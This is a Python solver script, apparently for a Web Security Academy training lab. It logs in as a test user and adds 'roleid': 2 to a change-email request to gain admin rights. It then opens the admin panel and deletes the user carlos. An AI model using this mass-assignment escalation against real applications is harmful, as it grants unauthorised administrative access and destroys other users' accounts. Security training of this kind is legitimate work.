#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: User role can be modified in user profile
#
# Steps: 1. Login as wiener
#        2. Change the roleid of wiener
#        3. Fetch the admin panel
#        4. Delete carlos
#
#################################################################

###########
# imports
###########
import requests
from colorama import Fore

# change this to your lab URL
url = "https://0ac700cb04e7d2e680f1c60200340090.web-security-academy.net"

try:  # login as wiener
    data = {
        "username": "wiener",
        "password": "peter"
    }
    login = requests.post(f"{url}/login", data, allow_redirects=False)
    if login.status_code == 302:
        print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
        session = login.cookies.get("session")

        try:  # change the roleid; chaning the email is not important
            cookies = {"session": session}
            json = {
                "email": "wiener@admin.net",
                "roleid": 2
            }
            change_email = requests.post(
                f"{url}/my-account/change-email", cookies=cookies, json=json, allow_redirects=False)
            print(Fore.WHITE + "2. Changing roleid to 2.. " + Fore.GREEN + "OK")
            # fetch admin panel
            # this step is not necessary in the script, you can do step 4 directrly
            # it's a must only when solving the lab using the browser
            try:
                admin_panel = requests.get(f"{url}/admin", cookies=cookies)
                if admin_panel.status_code == 200:
                    print(
                        Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")

                    try:  # delete the carlos
                        delete_carlos = requests.get(
                            f"{url}/admin/delete?username=carlos", cookies=cookies)
                        if delete_carlos.status_code == 200:
                            print(
                                Fore.WHITE + "4. Deleting carlos.. " + Fore.GREEN + "OK")
                            print(
                                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                        else:
                            print(Fore.RED + "[!] Failed to delete carlos")
                    except:
                        print(
                            Fore.RED + "[!] Failed to delete carlos through exception")
                else:
                    print(Fore.RED + "[!] Failed to fetch admin panel")
            except:
                print(
                    Fore.RED + "[!] Failed to fetch admin panel through exception")
        except:
            print(
                Fore.RED + "[!] Failed to change the email roleid through exception")
    else:
        print(Fore.RED + "[!] Failed to fetch /login")
except:
    print(Fore.RED + "[!] Failed to fetch /login through exception")
